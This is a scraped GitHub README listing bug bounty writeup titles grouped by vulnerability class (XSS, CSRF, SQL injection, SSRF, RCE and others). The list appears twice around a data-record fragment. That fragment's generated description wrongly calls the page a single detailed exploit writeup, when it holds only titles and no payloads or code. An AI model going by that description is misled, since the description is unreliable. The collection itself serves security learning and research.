Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#2fa-related-issues", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#2fa-related-issues. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF 